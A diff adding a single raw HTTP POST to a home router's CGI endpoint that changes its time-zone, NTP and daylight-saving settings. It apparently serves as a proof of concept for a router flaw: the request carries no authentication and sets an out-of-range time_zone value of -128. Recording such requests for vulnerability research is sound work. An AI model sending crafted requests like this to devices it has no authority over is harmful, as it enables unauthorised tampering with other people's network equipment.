@@ -1,0 +1,13 @@
+POST /my_cgi.cgi?0.6840898656355359 HTTP/1.1
+Host: 192.168.0.1
+Content-Length: 309
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Origin: http://192.168.0.1
+Referer: http://192.168.0.1/Time.htm
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+request=update_entry&table_name=time&rowid=0&zone_index=4&time_zone=-128&ntp_enable=1&ntp_server=www.baidu.com&request=update_entry&table_name=daylight_saving&rowid=0&daylight_saving_enable=1&daylight_offset=3600&start_month=3&start_week=3&start_day=1&start_hour=1&end_month=11&end_week=2&end_day=1&end_hour=1
